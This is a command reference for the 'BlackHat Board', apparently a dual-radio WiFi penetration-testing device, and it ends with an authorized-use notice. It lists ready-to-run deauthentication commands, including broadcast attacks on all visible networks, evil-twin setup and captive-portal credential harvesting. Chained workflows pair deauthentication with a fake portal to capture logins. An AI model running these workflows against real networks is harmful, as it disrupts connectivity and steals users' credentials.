# BlackHat Board - Complete Functionality Reference

The BlackHat Board provides a comprehensive suite of WiFi security testing and network analysis tools through the `bh` command-line interface.

## WiFi Core Operations

### Network Scanning
```bash
bh wifi list <iface>        # Scan and list available WiFi networks
```
Lists all visible WiFi access points using the specified wireless interface.

### Interface Management
```bash
bh wifi dev                 # Enumerate wireless interfaces and capabilities
```
Shows available wireless interfaces with their frequency bands (2.4GHz, 5GHz support).

### Network Connection
```bash
bh wifi con <iface>         # Connect to configured network
bh wifi con stop            # Disconnect from network
```
Connect to or disconnect from WiFi networks using stored credentials.

### Access Point Creation
```bash
bh wifi ap <iface>          # Create access point
bh wifi ap stop             # Stop access point
```
Create a fake access point for testing or attack scenarios.

### IP Address Information
```bash
bh wifi ip                  # Display IP addresses of wireless interfaces
```

## Attack Vectors

### Evil Twin Attack
```bash
bh evil_twin                # Enable internet passthrough for MITM positioning
```
Creates a malicious access point that mirrors a legitimate network, allowing man-in-the-middle attacks while providing internet connectivity to maintain victim connections.

### Evil Portal (Captive Portal)
```bash
bh evil_portal              # Start captive portal for credential harvesting
bh evil_portal stop         # Stop captive portal
```
Deploys a captive portal that intercepts and captures user credentials. The portal can use custom HTML pages:
- `index.html` - Primary portal page

### Deauthentication Attacks

**Professional-grade deauth functionality with explicit targeting:**

#### **Target Discovery**
```bash
bh deauth_scan [interface]      # Scan for targets and show available APs/clients
```

#### **Specific Client Attack**  
```bash
bh deauth <client_mac> <ap_mac> [interface] [count]
# Example: bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1
```

#### **All Clients from AP**
```bash
bh deauth_all <ap_mac> [interface] [count]  
# Example: bh deauth_all 11:22:33:44:55:66 wlan1
```

#### **Nuclear Option (All Networks)**
```bash
bh deauth_broadcast [interface] [count]     # WARNING: Attacks all visible networks
```

**Interface Usage:**
- **wlan0** (2.4GHz onboard): Use for 2.4GHz targets or when wlan1 unavailable
- **wlan1** (5GHz USB): Default for attacks, allows maintaining SSH connection on wlan0
- **Automatic fallback**: Commands default to wlan1, specify wlan0 if needed

**Technical Details:**
- **Explicit targeting**: No guesswork - specify exact client and AP MACs
- **Dual-radio advantage**: Stay connected on wlan0 while attacking with wlan1
- **Configurable count**: Default 10 deauth frames, customizable
- **Monitor mode management**: Automatically handles interface setup/teardown
- **Professional workflow**: Scan → Identify → Attack

**Interface Caveats:**
- **Cannot use same interface** for connection and monitor mode simultaneously
- **wlan0 connection preserved** when using wlan1 for attacks
- **Monitor mode conflicts**: Reset interface if "Failed to set monitor mode"
  ```bash
  # Interface reset if needed:
  iw dev wlan1 set type managed
  ip link set wlan1 down && ip link set wlan1 up
  ```

## Monitoring & Intelligence

### Packet Capture
```bash
bh kismet <iface>           # Start Kismet packet capture and analysis
bh kismet stop              # Stop Kismet
```
Launches Kismet for comprehensive wireless packet capture, analysis, and monitoring. Accessible via web interface on port 2501.

### Network Connectivity Testing
```bash
bh test_inet                # Test internet connectivity (ping google.com)
```

## Configuration Management

### Network Credentials
```bash
bh set SSID "network_name"     # Set target network SSID
bh set PASS "password"         # Set network password
bh set AP_SSID "fake_ap_name"  # Set your fake access point name
```

### View Configuration
```bash
bh get                      # Display all current configuration settings
```

## System Management

### SSH Access
```bash
bh ssh                      # Start SSH daemon for remote access
bh ssh stop                 # Stop SSH daemon
```
Enables remote access to the BlackHat Board via SSH.

## Automation Framework

### Script Management
```bash
bh script scan              # List available automation scripts
bh script run <script>      # Execute custom automation script
```

## Typical Attack Workflows

### 1. Reconnaissance
```bash
# Identify wireless interfaces
bh wifi dev

# Scan for target networks
bh wifi list wlan0

# Monitor traffic
bh kismet wlan1
```

### 2. Evil Twin Setup
```bash
# Configure target network
bh set SSID "TargetNetwork"
bh set PASS "password123"

# Configure fake AP
bh set AP_SSID "TargetNetwork"

# Launch evil twin attack
bh evil_twin
```

### 3. Deauthentication Attacks
```bash
# Scan for targets first (keeps wlan0 connected for SSH)
bh deauth_scan wlan1

# Attack specific client (use MACs from scan results)
bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1

# Disconnect all clients from an AP
bh deauth_all 11:22:33:44:55:66 wlan1
```

### 4. Credential Harvesting
```bash
# Deploy captive portal
bh evil_portal

# Monitor captured credentials in logs
```

### 5. Advanced Attack Scenarios
```bash
# Deauth + Evil Twin combination
bh deauth_scan wlan1                        # Scan for targets
bh deauth_all 11:22:33:44:55:66 wlan1      # Force disconnect all clients from target AP
bh set AP_SSID "LegitNetwork"               # Create fake AP with same name  
bh evil_portal                              # Capture credentials when clients reconnect

# Targeted deauth + monitoring
bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1  # Disconnect specific user
bh kismet wlan0                             # Monitor for reconnection attempts

# Multi-band attack coordination
bh wifi con wlan0              # Connect to 2.4GHz network for internet
bh deauth_scan wlan1           # Attack 5GHz networks with USB dongle
bh deauth_all [5GHz_AP] wlan1  # Attack 5GHz while maintaining 2.4GHz connection
```

## Hardware Configuration

The BlackHat Board features a dual-radio design optimized for wireless security testing:

### **Radio Configuration**
- **wlan0 (RTL8723DS)**: 2.4GHz onboard radio with integrated antenna
- **wlan1 (RTL8821CU)**: 2.4GHz/5GHz USB dongle for enhanced capability

### **Interface Management Best Practices**
- **SSH Access**: Connect wlan0 to a stable network for remote access
- **Attack Operations**: Use wlan1 for monitor mode and injection attacks
- **Dual-Band Strategy**: Attack 5GHz networks with wlan1 while maintaining 2.4GHz connection on wlan0
- **Interface Reset**: If monitor mode fails, reset interface to managed mode first

### **Typical Setup Workflow**
```bash
# 1. Establish stable connection for SSH access
bh set SSID "YourNetwork"
bh set PASS "YourPassword"  
bh wifi con wlan0

# 2. Use wlan1 for attacks
bh deauth_scan wlan1
bh deauth [targets] wlan1

# 3. Restore interfaces if needed
iw dev wlan1 set type managed  # Reset to managed mode
ip link set wlan1 down && ip link set wlan1 up
```

## Security Considerations

This tool is designed for authorized security testing and educational purposes only. Users must:
- Obtain proper authorization before testing
- Comply with local laws and regulations
- Use only on networks you own or have explicit permission to test
- Understand the legal implications of wireless security testing

## Configuration Files

- Primary config: `blackhat.conf`
- Logs: `blackhat.log`
- Portal pages: `/var/www/`
- Network configs: `/etc/hostapd.conf`, `/etc/dnsmasq.conf`
